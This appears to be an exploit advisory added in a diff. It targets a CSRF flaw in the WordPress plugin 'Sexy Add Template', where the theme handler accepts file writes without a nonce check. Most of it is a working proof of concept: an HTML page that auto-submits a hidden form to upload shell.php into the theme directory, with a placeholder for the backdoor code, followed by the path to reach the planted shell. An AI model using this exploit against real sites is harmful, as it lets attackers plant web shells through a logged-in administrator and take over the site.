@@ -1,0 +1,27 @@
+#################################################################################
+ #
+ # [ Information Details ]
+ # - Wordpress Plugin Sexy Add Template:
+ # Attacker allow CSRF Upload Shell.
+ # http://localhost/wp-admin/themes.php?page=AM-sexy-handle <--- Vuln CSRF, not require verification CODE "wpnonce".
+ #
+ # <html>
+ # <head>
+ # <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ # <title>Wordpress Plugin Sexy Add Template - CSRF Upload Shell Vulnerability</title>
+ # </head>
+ # <body onload="document.form0.submit();">
+ # <form method="POST" name="form0" action="http://localhost/wp-admin/themes.php?page=AM-sexy-handle" method="post" enctype="multipart/form-data" >
+ # <input type="hidden" name="newfile" value="yes" /> 
+ # <input type="hidden" type="text" value="shell.php" name="AM_filename">
+ # <textarea type="hidden" name="AM_file_content">
+ # [ Your Script Backdoor/Shell ]
+ # </textarea>
+ # </form>
+ # </body>
+ # </html>
+ #
+ # - Access Shell:
+ # http://www.example.com/wp-content/themes/[theme-name]/shell.php <--- HACKED...!!!
+ #
+ # +#################################################################################
